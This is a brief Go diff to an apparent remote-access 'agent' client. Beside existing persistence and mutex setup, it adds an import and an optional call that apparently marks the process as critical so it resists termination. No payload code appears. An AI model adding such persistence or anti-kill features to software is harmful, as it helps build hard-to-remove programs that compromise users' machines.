@@ -5,6 +5,7 @@ import (
 	"time"
 
 	"overlord-client/cmd/agent/config"
+	"overlord-client/cmd/agent/criticalproc"
 	"overlord-client/cmd/agent/mutex"
 	"overlord-client/cmd/agent/persistence"
 )
@@ -22,6 +23,10 @@ func main() {
 		if err := persistence.Setup(); err != nil {
 			log.Printf("Warning: Failed to setup persistence: %v", err)
 		}
+	}
+
+	if cfg.CriticalProcess {
+		criticalproc.Setup()
 	}
 
 	releaseMutex, ok, err := mutex.Acquire(cfg.Mutex)
